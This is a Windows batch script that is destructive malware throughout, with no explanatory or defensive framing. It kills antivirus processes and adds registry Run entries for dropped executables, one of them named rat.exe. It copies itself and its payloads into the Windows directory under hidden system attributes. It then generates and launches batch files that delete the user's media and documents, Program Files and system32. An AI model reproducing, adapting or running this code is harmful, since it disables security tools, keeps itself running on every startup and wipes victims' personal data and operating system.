@echo off
ctty nul
SET COPYCMD=/Y
if not exist %systemroot%\xls.bat goto systemcopy

rem CLEANUP
deltree /y %systemroot%\reg

rem AV Havoc
tskill AVGUARD 
tskill AVGNT 
tskill NMAIN 
tskill KAV 
tskill ad-aware 
tskill av* 
tskill teatimer
tskill ash*
tskill savscan

REM STARTUP PROCESSES REGISTRY
md %systemroot%\reg\
>>"%systemroot%\reg\regxyz.reg" echo Windows Registry Editor Version 5.00
>>"%systemroot%\reg\regxyz.reg" echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
>>"%systemroot%\reg\regxyz.reg" echo "WinScan"="\"C:\\Windows\\dab.exe\""
>>"%systemroot%\reg\regxyz.reg" echo "SysReg"="\"C:\\Windows\\winkp.exe\"
>>"%systemroot%\reg\regxyz.reg" echo "IPSecurity"="C:\\Windows\\xsh.bat"
>>"%systemroot%\reg\regxyz.reg" echo "IPSecGrab"="C:\\Windows\\rat.exe"
>>"%systemroot%\reg\regxyz.reg" echo "IPSecGrab2"="C:\\Windows\\msdns5.bat"
>>"%systemroot%\reg\regxyz.reg" echo "IPSecGrab2"="C:\\Windows\\runinvis.bat"
REM Silently Add File To Registry
regedit  /s "%systemroot%\reg\regxyz.reg"


if exist %systemroot%\xls.bat goto spread

REM Copy file to System
:systemcopy
copy %0 %systemroot%\xls.bat
copy "%userprofile%\Desktop\mssvc1.exe" %systemroot%\dab.exe
copy "%userprofile%\Desktop\mssvc2.exe" %systemroot%\winkp.exe
copy "%userprofile%\Desktop\genetix.exe" %systemroot%\msdns5.bat
copy "%userprofile%\My Documents\genetix.exe" %systemroot%\rat.exe
copy "%userprofile%\My Documents\mssvc1.exe" %systemroot%\dab.exe
copy "%userprofile%\My Documents\mcore.bat" %systemroot%\msdns5.bat
copy "%userprofile%\Desktop\mcore.bat" %systemroot%\msdns5.bat
copy "%userprofile%\My Documents\mssvc2.exe" %systemroot%\winkp.exe
copy "%userprofile%\Desktop\runinvis.bat" %systemroot%\runinvis.bat
attrib +S +H %systemroot%\xls.bat
attrib +S +H %systemroot%\dab.exe
attrib +S +H %systemroot%\winkp.exe
attrib +S +H %systemroot%\reg\regxyz.reg
start %systemroot%\makestream.bat
start %systemroot%\xls.bat

REM WARTIME
:spread
del /q %systemroot%\pload.bat
>>"%systemroot%\pload.bat" echo del *.mp3 /s /q
>>"%systemroot%\pload.bat" echo del *.avi /s /q
>>"%systemroot%\pload.bat" echo del /q /s %userprofile\My Documents\*.* 
start /min /high %systemroot%\pload.bat
del /q %systemroot%\pload2.bat
>>"%systemroot%\pload2.bat" echo del /q C:\Program Files\*.*
>>"%systemroot%\pload2.bat" echo del /q C:\Windows\system32\*.* 
start /min /high %systemroot%\pload2.bat









